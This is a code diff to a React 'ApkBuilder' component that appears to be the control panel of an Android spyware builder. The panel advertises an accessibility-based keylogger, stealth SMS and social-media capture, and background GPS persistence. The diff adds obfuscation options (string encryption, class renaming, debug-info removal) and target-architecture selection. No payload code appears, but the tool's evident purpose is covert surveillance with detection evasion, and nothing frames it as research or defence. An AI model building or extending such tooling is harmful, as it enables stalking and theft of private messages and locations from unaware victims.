@@ -39,6 +39,12 @@ interface ApkConfig {
   ports: number[];
   serverUrl: string;
   iconUrl: string;
+  enableKeylogger?: boolean;
+  enableActiveTracking?: boolean;
+  enableAccessibilityMonitor?: boolean;
+  obfuscate?: boolean;
+  advancedObfuscation?: boolean;
+  targetArchitectures?: string[];
 }
 
 export default function ApkBuilder() {
@@ -56,6 +62,9 @@ export default function ApkBuilder() {
     enableKeylogger: false,
     enableActiveTracking: false,
     enableAccessibilityMonitor: false,
+    obfuscate: false,
+    advancedObfuscation: false,
+    targetArchitectures: ["arm64-v8a", "armeabi-v7a"],
   });
   const [newPort, setNewPort] = useState("");
   const [copiedBuildId, setCopiedBuildId] = useState<string | null>(null);
@@ -443,15 +452,89 @@ export default function ApkBuilder() {
                   </div>
 
                   <div className="border-glow-cyan p-4 rounded">
-                    <p className="text-sm font-medium glow-cyan mb-2">
-                      ⚠️ Platinum Advanced Features
-                    </p>
+                    <h3 className="font-medium text-amber-500 mb-2 border-b border-amber-900 pb-2">
+                      ⚠️ Enterprise Advanced Features
+                    </h3>
                     <ul className="text-xs text-muted-foreground space-y-1">
                       <li>✓ Accessibility-based Keylogger</li>
                       <li>✓ Real-time Permission Matrix</li>
                       <li>✓ Stealth SMS & Social Capture</li>
                       <li>✓ Background GPS Persistence</li>
                     </ul>
+                  </div>
+                </div>
+              </div>
+
+              {/* Obfuscation & Security */}
+              <div className="card-neon-cyan">
+                <h3 className="text-lg font-bold mb-4 glow-cyan flex items-center gap-2">
+                  <Code className="w-5 h-5" />
+                  Obfuscation & Security
+                </h3>
+                <div className="space-y-4">
+                  <div className="flex items-center justify-between p-4 bg-accent/10 rounded">
+                    <div>
+                      <p className="font-medium text-amber-400">Code Obfuscation (Basic)</p>
+                      <p className="text-sm text-muted-foreground">
+                        Rename classes to single letters (a, b, c...)
+                      </p>
+                    </div>
+                    <Switch
+                      checked={config.obfuscate || false}
+                      onCheckedChange={(checked) =>
+                        setConfig({ ...config, obfuscate: checked })
+                      }
+                    />
+                  </div>
+
+                  {config.obfuscate && (
+                    <div className="flex items-center justify-between p-4 bg-accent/10 rounded border border-red-500/30">
+                      <div>
+                        <p className="font-medium text-red-400">Advanced Obfuscation (Pro)</p>
+                        <p className="text-sm text-muted-foreground">
+                          Encrypt strings, remove debug info, obfuscate methods
+                        </p>
+                      </div>
+                      <Switch
+                        checked={config.advancedObfuscation || false}
+                        onCheckedChange={(checked) =>
+                          setConfig({ ...config, advancedObfuscation: checked })
+                        }
+                      />
+                    </div>
+                  )}
+
+                  {config.advancedObfuscation && (
+                    <div className="bg-red-500/10 border border-red-500/20 rounded p-3">
+                      <p className="text-xs text-red-300">
+                        ⚠️ Advanced obfuscation includes: string encryption, method renaming, 
+                        class obfuscation, and removal of debug information.
+                      </p>
+                    </div>
+                  )}
+
+                  <div>
+                    <p className="font-medium text-amber-400 mb-2">Target Architectures</p>
+                    <div className="grid grid-cols-2 gap-2">
+                      {["arm64-v8a", "armeabi-v7a", "x86", "x86_64"].map((arch) => (
+                        <div key={arch} className="flex items-center gap-2">
+                          <Switch
+                            checked={config.targetArchitectures?.includes(arch) || false}
+                            onCheckedChange={(checked) => {
+                              const current = config.targetArchitectures || [];
+                              const newArchs = checked
+                                ? [...current, arch]
+                                : current.filter((a) => a !== arch);
+                              setConfig({ ...config, targetArchitectures: newArchs });
+                            }}
+                          />
+                          <span className="text-sm text-muted-foreground">{arch}</span>
+                        </div>
+                      ))}
+                    </div>
+                    <p className="text-xs text-muted-foreground mt-2">
+                      Note: Multi-ABI requires Android NDK for native compilation
+                    </p>
                   </div>
                 </div>
               </div>
@@ -675,7 +758,7 @@ export default function ApkBuilder() {
                               ×
                             </Button>
                           </div>
-                          <pre className="text-[10px] font-mono whitespace-pre-wrap break-all max-h-[300px] overflow-y-auto text-muted-foreground p-2 bg-black/20 rounded">
+                          <pre className="text-[10px] font-mono whitespace-pre-wrap break-all max-h-[300px] overflow-y-auto text-white p-2 bg-black/40 rounded border border-white/10">
                             {build.buildLogs}
                           </pre>
                         </div>
